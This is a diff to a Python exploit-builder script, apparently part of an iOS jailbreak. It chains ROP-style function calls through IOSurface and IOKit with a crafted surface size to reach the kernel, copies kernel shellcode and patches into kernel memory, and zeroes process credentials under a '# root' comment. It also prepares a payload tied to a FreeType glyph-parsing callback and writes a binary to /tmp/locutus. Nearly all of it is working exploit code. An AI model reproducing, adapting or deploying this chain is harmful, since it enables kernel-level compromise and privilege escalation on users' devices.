@@ -29,41 +29,15 @@ def dbg_result():
         back = sys._getframe().f_back
         funcall('_printf', ptr('Result for %s:%d was %%08x\n' % (back.f_code.co_filename, back.f_lineno), True), result)
 
-dmini.init(kernfile, False)
-
-proc_ucred = dmini.cur.sym('_proc_ucred')
-weirdfile = Connection('kcode.o', False).nth_segment(0)
-while True:
-    namelen = patchfp.read(4)
-    if len(namelen) == 0: break
-    if len(namelen) != 4: raise Exception('truncated')
-    name = read(patchfp, struct.unpack('I', namelen)[0])
-    addr, = struct.unpack('I', read(patchfp, 4))
-    data = read(patchfp, struct.unpack('I', read(patchfp, 4))[0])
-    if name == 'sysent patch':
-        sysent_patch, = struct.unpack('I', data)
-    elif name == 'sysent patch orig':
-        sysent_patch_orig, = struct.unpack('I', data)
-    elif name == 'scratch':
-        scratch, = struct.unpack('I', data)
-    if addr == 0 or len(data) == 0 or name.startswith('+'): # in place only
-        continue
-    weirdfile += struct.pack('II', addr, len(data)) + data
-# TODO troll string and I()
-weirdfile += struct.pack('IIIII', sysent_patch, 4, sysent_patch_orig, 0, proc_ucred
 
 #set_fwd('PC0', dmini.cur.find_basic('- 00 f0 96 e8')) # ldm r6, {ip, sp, lr, pc}
 #set_fwd('PC0', dmini.cur.find_basic('- 00 f0 b4 e9')) # ldm r4!, {ip, sp, lr, pc}
 
-init('PC')
-make_avail()
-code_addr = 0x80000400 # xxx
-funcall('_memcpy', code_addr, ptr(weirdfile), len(weirdfile))
-set_fwd('PC', code_addr)
-kstuff = finalize(None)
-print 'len:', len(kstuff)
-
 dmini.init(cachefile, True)
+dmini.cur.add_lib('ft', '/System/Library/Frameworks/CoreGraphics.framework/Resources/libCGFreetype.A.dylib')
+dmini.cur.add_lib('iosurface', '/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface')
+dmini.cur.add_lib('iokit', '/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit')
+dmini.cur.add_lib('libz', '/usr/lib/libz.dylib')
 
 def wrap(num):
     if (num & 0xf0000000) == 0x30000000:
@@ -93,9 +67,9 @@ if mode == 'dejavu':
     add_r0_by(reloc(0xc, 0))
     zplistp, zplistpp = stackunkpair()
     store_r0_to(zplistpp)
-    mtss_count = 9
+    mtss_count = 1
 else:
-    mtss_count = 5
+    mtss_count = 1
 
 mtss = []
 for i in xrange(mtss_count):
@@ -117,39 +91,64 @@ if mode == 'dejavu':
     funcall('_mach_make_memory_entry', None, sizep, 0x1000, 5, memory_entryp, 0); dbg_result()
 
 kstart = pointed('')
-w, h = 1, kstart
-funcall('_IOSurfaceWrapClientImage', 0x41424752, w, h, 4, 4*w*h, 0)
+funcall('iosurface._IOSurfaceWrapClientImage', 0x41424752, 1, pointer(kstart), 4, 0x30000000, 0)
 dbg_result(); funcall('_abort')
-surface, surfacep = stackunkpair()
-store_r0_to(surfacep)
-funcall('_IOSurfaceGetID', None)
+if mode == 'dejavu':
+    surface, surfacep = stackunkpair()
+    store_r0_to(surfacep)
+funcall('iosurface._IOSurfaceGetID', None)
 surface_id, surface_idp = stackunkpair()
 store_r0_to(surface_idp)
 
 if mode == 'two':
     # XXX is this necessary? it's from star
-    funcall('_IOKitWaitQuiet', 0, ptrI(0, 0, 0))
+    funcall('iokit._IOKitWaitQuiet', 0, ptrI(0, 0, 0))
 
-funcall('_IOServiceMatching', ptr('AppleRGBOUT', True))
+funcall('iokit._IOServiceMatching', ptr('AppleRGBOUT', True))
 connect = ptrI(0)
-funcall('_IOServiceOpen', None, mtss.pop(), 0, connect); dbg_result()
+funcall('iokit._IOServiceOpen', None, mtss.pop(), 0, connect); dbg_result()
 js = ptrI(surface_id, 0, 9 if four_dot_three else 8, 0)
-funcall('_IOConnectCallScalarMethod', connect, 1, js, 2, 0, 0, load_r0=True)
+funcall('iokit._IOConnectCallScalarMethod', connect, 1, js, 2, 0, 0, load_r0=True)
 
 # now an interlude
 clear_fwd()
-heapadd(fwd('R4'), fwd('R5'), fwd('R6'), kstart, fwd('R7'), fwd('PC'))
-code_addr = 0x80000400 # xxx
-funcall('_memcpy', code_addr, ptr(weirdfile), len(weirdfile))
-set_fwd('PC', code_addr)
-clear_fwd()
+old_cur = dmini.cur
+dmini.init(kernfile, False)
 
+heapadd(fwd('R4'), fwd('R5'), fwd('R6'), kstart, fwd('R7'), fwd('PC'))
+
+code_addr = 0x80000000 # XXX
+weirdfile = dmini.Connection('kcode.o', False).relocate(dmini.cur, code_addr).nth_segment(0)
+weirdfile += I(dmini.cur.sym('_proc_ucred'),
+               dmini.cur.sym('_memcpy'),
+               dmini.cur.sym('_flush_dcache'),
+               dmini.cur.sym('_invalidate_icache'))
+while True:
+    namelen = patchfp.read(4)
+    if len(namelen) == 0: break
+    if len(namelen) != 4: raise Exception('truncated')
+    name = read(patchfp, struct.unpack('I', namelen)[0])
+    addr, = struct.unpack('I', read(patchfp, 4))
+    data = read(patchfp, struct.unpack('I', read(patchfp, 4))[0])
+    if addr == 0 or len(data) == 0 or name.startswith('+'): # in place only
+        continue
+    weirdfile += I(addr, len(data)) + data
+
+# root
+funcall('_current_proc')
+funcall('_proc_ucred')
+#add_r0_by(0xc)
+store_to_r0(0)
+
+clear_fwd()
+dmini.cur = old_cur
+heapadd(fwd('R4'), fwd('R7'), fwd('PC'))
 
 # do some housekeeping
 # (but don't bother if we're going to exec)
 if mode == 'dejavu':
     funcall('_CFRelease', surface)
-    funcall('_IOServiceClose', connect, load_r0=True)
+    funcall('iokit._IOServiceClose', connect, load_r0=True)
 
     # the boring stuff
 
@@ -160,10 +159,7 @@ if mode == 'dejavu':
     funcall('_malloc', reloc(0xa, 0))
     locutusp, locutuspp = stackunkpair()
     store_r0_to(locutuspp)
-    dmini.cur.push_file('/usr/lib/libz.dylib')
-    funcall('_uncompress', None, ptrI(reloc(0xa, 0)), zlocutusp, reloc(0xb, 0))
-    dmini.cur.pop_file()
-    dbg_result()
+    funcall('libz._uncompress', None, ptrI(reloc(0xa, 0)), zlocutusp, reloc(0xb, 0)); dbg_result()
     locutus_str = ptr('/tmp/locutus', True)
     funcall('_open', locutus_str, O_WRONLY | O_CREAT | O_TRUNC, 0755)
     fd, fdp = stackunkpair()
@@ -192,18 +188,17 @@ if mode == 'dejavu':
 
     final = finalize(reloc(0xd, 0))
 
-    heapdump(final)
 
     # add sp, #400; pop {r4, r5, pc}
     parse_callback = dmini.cur.find_basic('+ 64 b0 30 bd').value
     print hex(parse_callback)
-    dmini.cur.push_file('/System/Library/Frameworks/CoreGraphics.framework/Resources/libCGFreetype.A.dylib')
-    actual_parse_callback = dmini.cur.private_sym('_T1_Parse_Glyph').value
+    actual_parse_callback = dmini.cur.private_sym('ft._T1_Parse_Glyph').value
 
     final = final.unpack()
 
     open('dejavu.txt', 'w').write(pickle.dumps({'parse_callback': parse_callback, 'actual_parse_callback': actual_parse_callback, 'final': final, 'plist': zplist}))
 else:
-    funcall('_execl', '/sbin/launchd.real', '/sbin/launchd')
+    funcall('_execl', ptr('/sbin/lunchd.real', True), 0)
     final = finalize(reloc(0, 0))
+    heapdump(final)
     open('two.txt', 'w').write(pickle.dumps({'segment': final, 'cmdstuff': cmdstuff}))
